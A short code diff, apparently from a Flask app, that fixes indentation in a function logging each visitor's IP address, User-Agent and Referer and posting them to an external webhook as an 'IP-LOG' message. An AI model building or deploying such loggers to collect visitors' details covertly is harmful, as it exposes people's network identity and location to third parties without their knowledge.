@@ -27,9 +27,9 @@ def log_ip():
     user_agent = request.headers.get('User-Agent')
     referer = request.headers.get("Referer", "Kein Referer")
 
-data = {
+    data = {
     "content": f"**IP-LOG:** {ip} | {request.headers.get('User-Agent')}\n**Referer:** {referer}"
-}
+    }
 
     try:
         r = requests.post(WEBHOOK_URL, json=data, timeout=10)
